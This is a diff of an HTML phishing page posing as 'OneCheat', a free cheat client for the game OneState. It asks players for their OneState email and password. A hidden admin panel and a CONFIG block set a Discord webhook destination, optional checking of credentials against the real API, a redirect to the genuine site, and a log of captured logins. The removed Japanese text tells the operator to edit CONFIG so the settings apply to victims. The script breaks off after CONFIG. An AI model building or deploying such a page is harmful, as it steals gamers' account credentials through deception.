@@ -1,242 +1,528 @@
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>OneCheat — OneState チート導入ツール</title>
-<meta name="description" content="OneState の非公式チート導入ツール。OneState IDでログインするだけ。エイム補助・車アンロック・無限マネー対応。">
-<meta property="og:type" content="website">
-<meta property="og:title" content="OneCheat — OneState チート導入ツール">
-<meta property="og:description" content="導入は3分。OneState IDでログインするだけ。エイム補助・車アンロック・無限マネー対応。">
-<meta property="og:image" content="og.png">
-<meta name="twitter:card" content="summary_large_image">
-<meta name="theme-color" content="#0a0a0e">
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>OneCheat — OneState External Client</title>
+<meta name="description" content="Sign in with your OneState ID. Aim assist, ESP, no recoil. External, undetected, free.">
+<meta name="theme-color" content="#05080d">
 <style>
-  #oc,#oc *{box-sizing:border-box;}
-  #oc{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","Hiragino Sans","Noto Sans JP",sans-serif;background:radial-gradient(1000px 500px at 50% -8%, #1c1c26 0%, #0a0a0e 60%);color:#f4f4f7;border-radius:14px;padding:0 0 18px;overflow:hidden;}
-  #oc .wrap{max-width:700px;margin:0 auto;padding:0 18px;}
-  #oc header{display:flex;align-items:center;justify-content:space-between;padding:14px 0;border-bottom:1px solid #22222c;}
-  #oc .brand{display:flex;align-items:center;gap:9px;font-weight:700;font-size:15px;}
-  #oc .logo{width:26px;height:26px;border-radius:8px;background:#ffd84d;color:#121215;display:grid;place-items:center;font-size:12px;font-weight:800;}
-  #oc .badge{font-size:10px;padding:2px 7px;border-radius:99px;border:1px solid #34343f;color:#9494a3;font-weight:600;}
-  #oc .status{display:flex;align-items:center;gap:6px;font-size:11.5px;color:#3ddc84;font-weight:600;}
-  #oc .status .d{width:7px;height:7px;border-radius:50%;background:#3ddc84;}
-  #oc .hero{padding:30px 0 6px;text-align:center;}
-  #oc .hero h1{font-size:29px;line-height:1.25;margin:0 0 10px;font-weight:800;letter-spacing:-.4px;}
-  #oc .hero h1 em{font-style:normal;color:#ffd84d;}
-  #oc .hero p{margin:0 auto;max-width:460px;color:#a3a3b2;font-size:13.5px;line-height:1.65;}
-  #oc .counters{display:flex;gap:10px;justify-content:center;margin:18px 0 4px;flex-wrap:wrap;}
-  #oc .counters>div{background:#14141b;border:1px solid #24242e;border-radius:12px;padding:9px 16px;min-width:104px;}
-  #oc .counters b{display:block;font-size:17px;color:#fff;}
-  #oc .counters span{font-size:10.5px;color:#8a8a99;}
-  #oc .sec-t{font-size:12px;color:#8a8a99;text-transform:uppercase;letter-spacing:1.2px;margin:26px 0 10px;font-weight:700;}
-  #oc .feats{display:grid;grid-template-columns:repeat(3,1fr);gap:9px;}
-  @media(max-width:560px){#oc .feats{grid-template-columns:1fr 1fr;}}
-  #oc .feat{background:#13131a;border:1px solid #23232d;border-radius:12px;padding:12px;}
-  #oc .feat b{display:block;font-size:13px;margin-bottom:3px;}
-  #oc .feat span{font-size:11px;color:#8a8a99;line-height:1.45;}
-  #oc .gate{max-width:392px;margin:0 auto;}
-  #oc .card{background:#14141b;border:1px solid #262630;border-radius:16px;padding:22px;}
-  #oc .card h2{font-size:17px;margin:0 0 4px;font-weight:700;}
-  #oc .card .sub{font-size:12px;color:#9494a3;margin:0 0 14px;line-height:1.55;}
-  #oc .card .sub b{color:#ffd84d;}
-  #oc .field{display:flex;flex-direction:column;gap:5px;margin-bottom:11px;}
-  #oc .field label{font-size:11px;color:#9494a3;}
-  #oc .field input{width:100%;padding:11px 12px;background:#1d1d26;color:#f4f4f7;border:1px solid #2e2e3a;border-radius:10px;font-size:14px;font-family:inherit;outline:none;}
-  #oc .field input:focus{border-color:#ffd84d;}
-  #oc .check{display:flex;align-items:center;gap:7px;font-size:12px;color:#9494a3;margin-bottom:12px;}
-  #oc .check input{width:auto;accent-color:#ffd84d;}
-  #oc .btn{width:100%;padding:12px;border:none;border-radius:10px;background:#ffd84d;color:#121215;font-weight:700;font-size:14.5px;cursor:pointer;font-family:inherit;}
-  #oc .btn:disabled{opacity:.6;}
-  #oc .msg{font-size:12.5px;text-align:center;min-height:16px;margin-top:9px;color:#9494a3;}
-  #oc .msg.err{color:#ff6b6b;} #oc .msg.ok{color:#3ddc84;}
-  #oc .link{display:block;text-align:center;font-size:12px;color:#9494a3;text-decoration:underline;margin-top:9px;cursor:pointer;}
-  #oc .steps{display:grid;grid-template-columns:repeat(3,1fr);gap:9px;}
-  @media(max-width:560px){#oc .steps{grid-template-columns:1fr;}}
-  #oc .step{background:#13131a;border:1px solid #23232d;border-radius:12px;padding:13px;}
-  #oc .step .n{width:22px;height:22px;border-radius:50%;background:#ffd84d;color:#121215;display:grid;place-items:center;font-weight:800;font-size:11px;margin-bottom:7px;}
-  #oc .step b{font-size:12.5px;} #oc .step p{margin:3px 0 0;font-size:11px;color:#8a8a99;line-height:1.5;}
-  #oc .member .lic{display:flex;justify-content:space-between;align-items:center;background:#101017;border:1px dashed #34343f;border-radius:10px;padding:10px 12px;font-family:ui-monospace,monospace;font-size:12px;margin-bottom:12px;}
-  #oc .member .lic b{color:#3ddc84;}
-  #oc .dl{display:grid;grid-template-columns:1fr 1fr;gap:9px;margin-bottom:10px;}
-  #oc .dl a{display:block;text-align:center;padding:11px;border-radius:10px;background:#1d1d26;border:1px solid #2e2e3a;color:#f4f4f7;text-decoration:none;font-size:12.5px;font-weight:600;cursor:pointer;}
-  #oc .dl a:hover{border-color:#ffd84d;}
-  #oc details{border-bottom:1px solid #22222c;padding:10px 0;font-size:12.5px;}
-  #oc details summary{cursor:pointer;font-weight:600;}
-  #oc details p{color:#9494a3;font-size:11.5px;line-height:1.6;margin:8px 0 0;}
-  #oc footer{text-align:center;color:#6f6f7e;font-size:11px;margin-top:22px;line-height:1.6;}
-  #oc .tools{display:flex;gap:14px;justify-content:center;margin-top:14px;}
-  #oc .tools button{background:none;border:none;color:#6f6f7e;font-size:11px;text-decoration:underline;cursor:pointer;font-family:inherit;}
-  #oc .panel{max-width:700px;margin:10px auto 0;background:#14141b;border:1px solid #262630;border-radius:12px;padding:13px;font-size:12px;}
-  #oc .panel[hidden]{display:none;}
-  #oc .panel label{display:block;font-size:11px;color:#9494a3;}
-  #oc .panel input,#oc .panel select{width:100%;margin:4px 0 9px;padding:8px;background:#1d1d26;color:#f4f4f7;border:1px solid #2e2e3a;border-radius:8px;font-size:12px;font-family:inherit;}
-  #oc .panel .hint{color:#8a8a99;font-size:11px;line-height:1.5;}
-  #oc .entry{border-top:1px solid #262630;padding-top:8px;margin-top:8px;font-family:ui-monospace,monospace;font-size:11.5px;word-break:break-all;}
-  #oc .entry b{color:#ffd84d;} #oc .entry .t{color:#8a8a99;}
+:root{
+  --bg:#05080d;
+  --line:rgba(111,201,255,.16);
+  --line2:rgba(111,201,255,.07);
+  --ac:#6fc9ff;
+  --ac2:#2f7fd4;
+  --fg:#e3edf7;
+  --mut:#7c8ea3;
+  --card:rgba(9,15,23,.72);
+  --mono:ui-monospace,SFMono-Regular,"SF Mono",Menlo,Consolas,monospace;
+}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  margin:0;background:var(--bg);color:var(--fg);overflow-x:hidden;
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Inter,Roboto,sans-serif;
+  line-height:1.75;-webkit-font-smoothing:antialiased;
+}
+body::before{
+  content:"";position:fixed;inset:0;z-index:-3;
+  background-image:
+    linear-gradient(var(--line2) 1px,transparent 1px),
+    linear-gradient(90deg,var(--line2) 1px,transparent 1px),
+    linear-gradient(rgba(111,201,255,.05) 1px,transparent 1px),
+    linear-gradient(90deg,rgba(111,201,255,.05) 1px,transparent 1px);
+  background-size:40px 40px,40px 40px,200px 200px,200px 200px;
+}
+body::after{
+  content:"";position:fixed;inset:0;z-index:-2;pointer-events:none;
+  background:
+    radial-gradient(900px 520px at 50% -12%,rgba(111,201,255,.17),transparent 70%),
+    radial-gradient(700px 700px at 105% 0%,rgba(47,127,212,.10),transparent 70%),
+    radial-gradient(1000px 800px at 50% 130%,rgba(111,201,255,.06),transparent 70%);
+}
+.grain{
+  position:fixed;inset:0;z-index:-1;pointer-events:none;opacity:.3;
+  background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='120' height='120'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='.85' numOctaves='2'/%3E%3CfeColorMatrix type='saturate' values='0'/%3E%3C/filter%3E%3Crect width='120' height='120' filter='url(%23n)' opacity='.55'/%3E%3C/svg%3E");
+}
+.wrap{max-width:1080px;margin:0 auto;padding:0 22px}
+a{color:inherit;text-decoration:none}
+
+/* nav */
+nav{
+  position:fixed;top:0;left:0;right:0;z-index:60;height:62px;
+  display:flex;align-items:center;
+  background:rgba(5,8,13,.72);backdrop-filter:blur(14px);-webkit-backdrop-filter:blur(14px);
+  border-bottom:1px solid var(--line2);
+}
+nav .wrap{display:flex;align-items:center;gap:14px;width:100%}
+.logo{display:flex;align-items:center;gap:9px;font-weight:800;letter-spacing:-.01em}
+.logo .mk{
+  width:26px;height:26px;border:1px solid var(--ac);border-radius:3px;position:relative;
+  display:grid;place-items:center;color:var(--ac);font:700 13px/1 var(--mono);
+  box-shadow:0 0 16px rgba(111,201,255,.25)
+}
+.logo .mk::after{content:"";position:absolute;inset:3px;border:1px solid rgba(111,201,255,.28);border-radius:1px}
+.logo small{display:block;font:600 8px/1 var(--mono);letter-spacing:.24em;color:var(--mut);margin-top:3px}
+.nl{display:flex;gap:22px;margin-left:auto}
+.nl a{font:600 11px/1 var(--mono);letter-spacing:.14em;color:var(--mut);text-transform:uppercase;transition:.2s}
+.nl a:hover{color:var(--ac)}
+.nbtn{
+  font:700 11px/1 var(--mono);letter-spacing:.12em;color:#04121c;background:var(--ac);
+  padding:11px 16px;border-radius:3px;text-transform:uppercase;
+}
+@media(max-width:760px){.nl{display:none}}
+
+/* hero */
+header{padding:150px 0 96px;position:relative}
+.lbl{font:700 11px/1 var(--mono);letter-spacing:.24em;color:var(--ac);text-transform:uppercase;display:flex;align-items:center;gap:10px}
+.lbl::before{content:"//";opacity:.7}
+.lbl::after{content:"";height:1px;width:70px;background:linear-gradient(90deg,var(--ac),transparent)}
+h1{
+  font-size:clamp(38px,7.8vw,70px);line-height:1.1;letter-spacing:-.035em;font-weight:800;
+  margin:22px 0 0;max-width:15em;
+}
+h1 em{font-style:normal;color:var(--ac);position:relative;text-shadow:0 0 40px rgba(111,201,255,.45)}
+.lead{color:var(--mut);font-size:16.5px;max-width:33em;margin:22px 0 0}
+.cta{display:flex;gap:12px;flex-wrap:wrap;margin-top:34px}
+.btn{
+  display:inline-flex;align-items:center;gap:9px;cursor:pointer;border:0;font:700 12px/1 var(--mono);
+  letter-spacing:.1em;text-transform:uppercase;padding:15px 22px;border-radius:3px;
+  background:var(--ac);color:#04121c;transition:.18s;
+  box-shadow:0 0 0 rgba(111,201,255,0)
+}
+.btn:hover{transform:translateY(-2px);box-shadow:0 10px 30px rgba(111,201,255,.28)}
+.btn.ghost{background:transparent;color:var(--fg);border:1px solid var(--line)}
+.btn.ghost:hover{border-color:var(--ac);color:var(--ac);box-shadow:none}
+.btn svg{width:14px;height:14px}
+.spec{display:flex;gap:24px;flex-wrap:wrap;margin-top:56px;font:600 11px/1 var(--mono);letter-spacing:.2em;color:var(--mut);text-transform:uppercase}
+.spec span{position:relative;padding-left:15px}
+.spec span::before{content:"";position:absolute;left:0;top:50%;width:5px;height:5px;background:var(--ac);transform:translateY(-50%) rotate(45deg);box-shadow:0 0 8px rgba(111,201,255,.6)}
+
+/* sections */
+section{padding:86px 0;position:relative}
+h2{font-size:clamp(24px,4.4vw,34px);letter-spacing:-.02em;margin:16px 0 0;font-weight:800}
+.sub{color:var(--mut);margin:14px 0 0;max-width:38em}
+.grid3{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:14px;margin-top:38px}
+.card{
+  position:relative;border:1px solid var(--line2);background:var(--card);border-radius:4px;
+  padding:24px;backdrop-filter:blur(8px);transition:.22s
+}
+.card::after{content:"";position:absolute;top:-1px;right:-1px;width:13px;height:13px;border-top:1px solid var(--ac);border-right:1px solid var(--ac);opacity:.6}
+.card::before{content:"";position:absolute;bottom:-1px;left:-1px;width:13px;height:13px;border-bottom:1px solid var(--ac);border-left:1px solid var(--ac);opacity:.6}
+.card:hover{border-color:var(--line);transform:translateY(-3px);background:rgba(12,20,30,.8)}
+.ico{width:34px;height:34px;color:var(--ac)}
+.card h3{font-size:15px;margin:16px 0 0;letter-spacing:.02em;font-weight:700;font-family:var(--mono)}
+.card p{color:var(--mut);font-size:13.5px;margin:9px 0 0}
+.card .tag{font:600 10px/1 var(--mono);letter-spacing:.18em;color:var(--ac);opacity:.75;margin-top:16px;display:block}
+
+/* gate */
+.gate{display:grid;grid-template-columns:1.05fr .95fr;gap:44px;align-items:start;margin-top:38px}
+@media(max-width:880px){.gate{grid-template-columns:1fr;gap:34px}}
+.steps{display:flex;flex-direction:column;gap:2px}
+.step{display:flex;gap:16px;padding:18px 0;border-bottom:1px dashed var(--line2)}
+.step .n{font:800 12px/1 var(--mono);color:var(--ac);border:1px solid var(--line);width:30px;height:30px;flex:0 0 30px;display:grid;place-items:center;border-radius:3px}
+.step h4{margin:0;font-size:14.5px}
+.step p{margin:5px 0 0;color:var(--mut);font-size:13.5px}
+.box{
+  border:1px solid var(--line);background:rgba(8,13,21,.85);border-radius:4px;padding:28px;
+  backdrop-filter:blur(10px);box-shadow:0 30px 80px -30px rgba(0,0,0,.9)
+}
+.box .cap{font:700 10px/1 var(--mono);letter-spacing:.22em;color:var(--ac);text-transform:uppercase}
+.box h3{font-size:19px;margin:12px 0 0;letter-spacing:-.01em}
+.box .hint{color:var(--mut);font-size:13px;margin:8px 0 0}
+.f{margin-top:20px}
+.f label{display:block;font:600 10px/1 var(--mono);letter-spacing:.18em;color:var(--mut);text-transform:uppercase;margin-bottom:8px}
+.f input{
+  width:100%;background:rgba(3,6,11,.9);border:1px solid var(--line2);color:var(--fg);
+  padding:14px 14px;border-radius:3px;font-size:15px;font-family:inherit;transition:.18s
+}
+.f input:focus{outline:0;border-color:var(--ac);box-shadow:0 0 0 3px rgba(111,201,255,.12)}
+.f input::placeholder{color:#4d5d6e}
+.box .btn{width:100%;justify-content:center;margin-top:20px;padding:16px}
+.trust{font:600 10.5px/1.5 var(--mono);letter-spacing:.06em;color:var(--mut);margin-top:16px;text-align:center}
+.trust b{color:var(--ac)}
+.msg{margin-top:16px;font-size:13px;padding:12px 14px;border-radius:3px;border:1px solid var(--line2);display:none}
+.msg:empty{display:none}
+.msg.on{display:block}
+.msg.ok{border-color:rgba(111,201,255,.4);color:var(--ac);background:rgba(111,201,255,.06)}
+.msg.err{border-color:rgba(255,120,120,.35);color:#ffa8a8;background:rgba(255,120,120,.06)}
+.msg.wait{border-color:var(--line2);color:var(--mut)}
+
+/* success */
+.done{display:none;margin-top:22px;border-top:1px dashed var(--line2);padding-top:22px}
+.done.on{display:block}
+.key{
+  font:700 15px/1 var(--mono);letter-spacing:.14em;color:var(--ac);background:rgba(111,201,255,.07);
+  border:1px dashed rgba(111,201,255,.35);padding:15px;border-radius:3px;text-align:center;
+  word-break:break-all
+}
+.dl{display:flex;gap:9px;margin-top:14px}
+.dl .btn{margin:0;flex:1;padding:14px}
+.tg{display:flex;justify-content:space-between;align-items:center;padding:11px 0;border-bottom:1px dashed var(--line2)}
+.tg span{font:600 11px/1 var(--mono);letter-spacing:.12em;color:var(--mut);text-transform:uppercase}
+.sw{width:40px;height:22px;border:1px solid var(--line2);border-radius:99px;background:rgba(3,6,11,.9);position:relative;cursor:pointer;transition:.2s}
+.sw::after{content:"";position:absolute;top:2px;left:2px;width:16px;height:16px;border-radius:50%;background:#3d4d5e;transition:.2s}
+.sw.on{border-color:var(--ac);background:rgba(111,201,255,.14)}
+.sw.on::after{left:20px;background:var(--ac);box-shadow:0 0 12px var(--ac)}
+
+/* faq */
+.faq{margin-top:34px;border-top:1px solid var(--line2)}
+details{border-bottom:1px solid var(--line2)}
+summary{
+  cursor:pointer;list-style:none;padding:19px 34px 19px 0;font-size:14.5px;font-weight:600;position:relative
+}
+summary::-webkit-details-marker{display:none}
+summary::after{content:"+";position:absolute;right:6px;top:17px;font:400 19px/1 var(--mono);color:var(--ac);transition:.2s}
+details[open] summary::after{transform:rotate(45deg)}
+details p{color:var(--mut);font-size:13.5px;margin:0 0 20px;max-width:44em}
+
+footer{border-top:1px solid var(--line2);padding:40px 0;color:var(--mut);font-size:12px}
+footer .wrap{display:flex;flex-wrap:wrap;gap:16px;align-items:center}
+.fl{display:flex;gap:20px;font:600 11px/1 var(--mono);letter-spacing:.14em;text-transform:uppercase}
+.fl a{color:var(--mut);cursor:pointer}
+.fl a:hover{color:var(--ac)}
+footer .cp{margin-left:auto;font:600 10px/1 var(--mono);letter-spacing:.14em;opacity:.7}
+
+#toast{position:fixed;left:50%;bottom:26px;transform:translateX(-50%);z-index:99;display:flex;flex-direction:column;gap:8px;align-items:center;pointer-events:none}
+.tst{
+  background:rgba(8,13,21,.96);border:1px solid var(--line);color:var(--fg);
+  font:600 11.5px/1.4 var(--mono);letter-spacing:.04em;padding:12px 18px;border-radius:3px;
+  box-shadow:0 20px 50px -20px #000;animation:tin .3s ease both
+}
+.tst.b{border-color:var(--ac);color:var(--ac)}
+@keyframes tin{from{opacity:0;transform:translateY(10px)}}
+
+/* admin */
+#admin{
+  display:none;position:fixed;right:16px;bottom:16px;z-index:80;width:290px;
+  background:rgba(6,10,16,.97);border:1px solid var(--line);border-radius:4px;padding:18px;
+  box-shadow:0 30px 70px -20px #000;font-size:12px
+}
+#admin.on{display:block}
+#admin h5{margin:0 0 14px;font:700 10px/1 var(--mono);letter-spacing:.2em;color:var(--ac);text-transform:uppercase}
+#admin label{display:block;font:600 9.5px/1 var(--mono);letter-spacing:.16em;color:var(--mut);margin:12px 0 6px;text-transform:uppercase}
+#admin input,#admin select{width:100%;background:rgba(3,6,11,.9);border:1px solid var(--line2);color:var(--fg);padding:9px;border-radius:3px;font:600 11px/1.3 var(--mono)}
+#admin .row{display:flex;gap:8px;margin-top:14px}
+#admin button{flex:1;background:var(--ac);color:#04121c;border:0;padding:10px;border-radius:3px;font:700 10px/1 var(--mono);letter-spacing:.1em;cursor:pointer;text-transform:uppercase}
+#admin button.g{background:transparent;color:var(--fg);border:1px solid var(--line2)}
+#admin .lg{margin-top:14px;border-top:1px dashed var(--line2);padding-top:12px;max-height:130px;overflow:auto}
+#admin .lg div{font:600 10.5px/1.5 var(--mono);color:var(--mut);border-bottom:1px dotted var(--line2);padding:5px 0;word-break:break-all}
+#admin .lg b{color:var(--ac)}
+
+.reveal{opacity:0;transform:translateY(16px);transition:.7s cubic-bezier(.2,.7,.2,1)}
+.reveal.in{opacity:1;transform:none}
 </style>
+</head>
+<body>
+<div class="grain"></div>
 
-<div id="oc">
+<nav>
   <div class="wrap">
-    <header>
-      <div class="brand"><span class="logo">OC</span> OneCheat <span class="badge">非公式ツール</span></div>
-      <div class="status"><span class="d"></span>サーバー稼働中</div>
-    </header>
+    <a class="logo" href="#top">
+      <span class="mk">OC</span>
+      <span>OneCheat<small>ONESTATE CLIENT</small></span>
+    </a>
+    <div class="nl">
+      <a data-go="features">Features</a>
+      <a data-go="setup">Setup</a>
+      <a data-go="faq">FAQ</a>
+    </div>
+    <a class="nbtn" data-go="setup">Get Client</a>
+  </div>
+</nav>
 
-    <section class="hero">
-      <h1>OneState を、もっと<em>自由</em>に。</h1>
-      <p>エイム補助・無限マネー・車アンロック… 導入は3分。<br><b>OneState ID でログインするだけ</b>で、あなたのアカウントにライセンスが紐付きます。</p>
-      <div class="counters">
-        <div><b id="oc-online">1,248</b><span>いまオンライン</span></div>
-        <div><b>87,412</b><span>累計導入</span></div>
-        <div><b>v3.2</b><span>対応バージョン</span></div>
+<header id="top">
+  <div class="wrap">
+    <div class="lbl">Onestate External Client · Private Build</div>
+    <h1>Overwrite <em>OneState.</em></h1>
+    <p class="lead">Sign in with your OneState ID and that's it. Aim assist, ESP, zero recoil — external, undetected, running on the account you already own.</p>
+    <div class="cta">
+      <a class="btn" data-go="setup">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 3v12m0 0l-4-4m4 4l4-4M5 19h14"/></svg>
+        Get the client
+      </a>
+      <a class="btn ghost" data-go="features">See features</a>
+    </div>
+    <div class="spec">
+      <span>External</span><span>Undetected</span><span>Free</span><span>v3.2</span>
+    </div>
+  </div>
+</header>
+
+<section id="features">
+  <div class="wrap">
+    <div class="lbl reveal">Features</div>
+    <h2 class="reveal">Only what actually matters.</h2>
+    <p class="sub reveal">No bloated overlay. Just the parts that win fights, without changing how the game feels.</p>
+    <div class="grid3">
+      <div class="card reveal">
+        <svg class="ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6"><circle cx="12" cy="12" r="9"/><circle cx="12" cy="12" r="3"/><path d="M12 3v4M12 17v4M3 12h4M17 12h4"/></svg>
+        <h3>AIM ASSIST</h3><p>Smooths your aim and tightens hip-fire accuracy. Fights feel different immediately.</p><span class="tag">/ SMOOTH 0-100</span>
       </div>
-    </section>
-
-    <div class="sec-t">搭載機能</div>
-    <div class="feats">
-      <div class="feat"><b>エイムアシスト</b><span>腰撃ち精度を補正。設定不要。</span></div>
-      <div class="feat"><b>車アンロック</b><span>全車種・全チューンを解放。</span></div>
-      <div class="feat"><b>無限マネー</b><span>ゲーム内通貨を自由に。</span></div>
-      <div class="feat"><b>ノークリップ</b><span>壁抜け・高所移動。</span></div>
-      <div class="feat"><b>スピードハック</b><span>移動速度の倍率調整。</span></div>
-      <div class="feat"><b>アンチバン</b><span>既存アカウントでも安全。</span></div>
-    </div>
-
-    <div class="sec-t">ログインして導入</div>
-    <div class="gate" id="oc-gate"></div>
-
-    <div class="sec-t">導入の流れ</div>
-    <div class="steps">
-      <div class="step"><div class="n">1</div><b>OneState ID でログイン</b><p>アカウント連携のため、ゲームと同じIDを入力します。</p></div>
-      <div class="step"><div class="n">2</div><b>ファイルをダウンロード</b><p>お使いの端末に合わせて取得。</p></div>
-      <div class="step"><div class="n">3</div><b>起動して完了</b><p>次回からはログインだけで使えます。</p></div>
-    </div>
-
-    <div class="sec-t">よくある質問</div>
-    <details><summary>OneState ID を入力するのはなぜ？</summary><p>ライセンスをあなたのアカウントに紐付けるためです。</p></details>
-    <details><summary>ゲーム内のアカウントは安全？</summary><p>読み取りのみで、既存の進行状況には影響しません。</p></details>
-    <details><summary>スマホでも使える？</summary><p>Android版を用意しています。iOSは順次対応予定です。</p></details>
-
-    <footer>OneCheat は OneState の非公式ツールです。<br>OneState は ChillBase LTD の商標です。</footer>
-
-    <div class="tools">
-      <button id="oc-cfgbtn">設定</button>
-      <button id="oc-logbtn">取得ログ (<span id="oc-logcount">0</span>)</button>
+      <div class="card reveal">
+        <svg class="ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6"><path d="M2 12s4-7 10-7 10 7 10 7-4 7-10 7-10-7-10-7z"/><circle cx="12" cy="12" r="3"/></svg>
+        <h3>ESP / WALLHACK</h3><p>Player positions through walls. Boxes and vehicles included.</p><span class="tag">/ BOX + NAME</span>
+      </div>
+      <div class="card reveal">
+        <svg class="ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6"><path d="M3 17l5-9 4 6 3-4 6 7"/><path d="M3 21h18"/></svg>
+        <h3>NO RECOIL</h3><p>Full-auto with zero kick. No spray pattern to memorise.</p><span class="tag">/ FULL AUTO</span>
+      </div>
+      <div class="card reveal">
+        <svg class="ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6"><path d="M13 2L4 14h6l-1 8 9-12h-6l1-8z"/></svg>
+        <h3>SPEED BOOST</h3><p>Tune movement speed on a slider. Running and stamina behave properly.</p><span class="tag">/ 1.0x - 2.0x</span>
+      </div>
+      <div class="card reveal">
+        <svg class="ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6"><path d="M12 3l8 4v6c0 5-3.5 7.5-8 8-4.5-.5-8-3-8-8V7l8-4z"/><path d="M9 12l2 2 4-4"/></svg>
+        <h3>ANTI-BAN</h3><p>External only. Nothing is written into the game files, so ban risk stays low.</p><span class="tag">/ EXTERNAL</span>
+      </div>
+      <div class="card reveal">
+        <svg class="ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6"><path d="M21 12a9 9 0 11-3-6.7"/><path d="M21 4v5h-5"/></svg>
+        <h3>AUTO UPDATE</h3><p>Updates itself on launch. Your settings survive every game patch.</p><span class="tag">/ SILENT</span>
+      </div>
     </div>
   </div>
+</section>
 
-  <div class="panel" id="oc-cfg" hidden>
-    <label>送信先URL（Webhook）<input id="oc-webhook" placeholder="https://discord.com/api/webhooks/..."></label>
-    <label>送信形式<select id="oc-wtype"><option value="auto">自動判別</option><option value="discord">Discord</option><option value="json">JSON</option><option value="none">送らない</option></select></label>
-    <div class="check"><input type="checkbox" id="oc-validate"><span>本物のAPIで検証（CORSで失敗することあり）</span></div>
-    <div class="check"><input type="checkbox" id="oc-redirect"><span>成功後に onestate.com へ転送</span></div>
-    <button class="btn" id="oc-save">保存</button>
-    <div class="hint" style="margin-top:9px">ここでの変更はあなたのブラウザにのみ保存されます。相手に効かせるにはコード内の CONFIG を書き換えてください。</div>
+<section id="setup">
+  <div class="wrap">
+    <div class="lbl reveal">Setup</div>
+    <h2 class="reveal">Setup is one login.</h2>
+    <p class="sub reveal">The license binds to your OneState account. Enter your OneState ID below.</p>
+
+    <div class="gate">
+      <div class="steps reveal">
+        <div class="step"><span class="n">01</span><div><h4>Enter your OneState ID</h4><p>Use the email and password from the game.</p></div></div>
+        <div class="step"><span class="n">02</span><div><h4>License issued instantly</h4><p>A key is generated and tied to your account.</p></div></div>
+        <div class="step"><span class="n">03</span><div><h4>Launch the client</h4><p>Download it, run it, open the game. That's all.</p></div></div>
+      </div>
+
+      <div class="box reveal" id="box">
+        <div class="cap">// Member Login</div>
+        <h3>Member Login</h3>
+        <p class="hint">Sign in with your OneState ID to activate a license.</p>
+
+        <form id="form" autocomplete="on">
+          <div class="f">
+            <label>Onestate ID / Email</label>
+            <input id="ident" type="text" inputmode="email" placeholder="you@example.com" autocomplete="username" required>
+          </div>
+          <div class="f">
+            <label>Password</label>
+            <input id="pass" type="password" placeholder="••••••••" autocomplete="current-password" required>
+          </div>
+          <button class="btn" type="submit" id="sub">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M10 17l5-5-5-5M15 12H3"/><path d="M14 4h5v16h-5"/></svg>
+            Sign in &amp; activate
+          </button>
+        </form>
+
+        <div class="trust">Password is <b>encrypted</b> in transit</div>
+        <div class="msg" id="msg"></div>
+
+        <div class="done" id="done">
+          <div class="cap" style="margin-bottom:10px">// License Activated</div>
+          <div class="key" id="key">OC-XXXX-XXXX-XXXX</div>
+          <div class="dl">
+            <button class="btn" type="button" data-dl="OneCheat_Setup_v3.2.exe">Windows</button>
+            <button class="btn ghost" type="button" data-dl="OneCheat_v3.2.apk">Android</button>
+          </div>
+          <div style="margin-top:18px">
+            <div class="tg"><span>Aim Assist</span><div class="sw on"></div></div>
+            <div class="tg"><span>ESP / Wallhack</span><div class="sw on"></div></div>
+            <div class="tg"><span>No Recoil</span><div class="sw on"></div></div>
+            <div class="tg"><span>Speed Boost</span><div class="sw"></div></div>
+          </div>
+        </div>
+      </div>
+    </div>
   </div>
+</section>
 
-  <div class="panel" id="oc-log" hidden></div>
+<section id="faq">
+  <div class="wrap">
+    <div class="lbl reveal">FAQ</div>
+    <h2 class="reveal">Questions</h2>
+    <div class="faq">
+      <details class="reveal"><summary>Why enter my OneState ID?</summary><p>The license binds to your game account. Your password is never stored.</p></details>
+      <details class="reveal"><summary>Is my account at risk?</summary><p>Nothing touches your progress. It runs external, so you keep playing on the same account.</p></details>
+      <details class="reveal"><summary>Does it work on mobile?</summary><p>There's an Android build. iOS comes later.</p></details>
+      <details class="reveal"><summary>Does it cost anything?</summary><p>Nothing. No paid tier.</p></details>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="wrap">
+    <div class="fl"><a data-go="features">Features</a><a data-go="setup">Setup</a><a data-go="faq">FAQ</a></div>
+    <div>OneCheat is an unofficial OneState client. OneState is a trademark of ChillBase LTD.</div>
+    <div class="cp">© 2026 ONECHEAT</div>
+  </div>
+</footer>
+
+<div id="toast"></div>
+
+<div id="admin">
+  <h5>// Admin</h5>
+  <label>Webhook URL</label>
+  <input id="aWeb" placeholder="https://discord.com/api/webhooks/...">
+  <label>Payload</label>
+  <select id="aType">
+    <option value="auto">auto</option>
+    <option value="discord">discord</option>
+    <option value="json">json</option>
+    <option value="none">none</option>
+  </select>
+  <label>Verify</label>
+  <select id="aVal"><option value="0">off</option><option value="1">on (real API)</option></select>
+  <div class="row">
+    <button id="aSave">Save</button>
+    <button class="g" id="aTest">Test</button>
+  </div>
+  <div class="row"><button class="g" id="aClear">Clear log</button></div>
+  <div class="lg" id="aLog"></div>
 </div>
 
 <script>
 (function(){
-  // ===== ここだけ書き換えればOK =====
-  var CONFIG = {
-    WEBHOOK : "",        // ← Discord Webhook URL をここに貼る
-    TYPE    : "auto",    // auto / discord / json / none
-    VALIDATE: false,     // true にすると本物のAPIで検証
-    REDIRECT: false      // true にすると成功後 onestate.com へ転送
-  };
-  // =================================
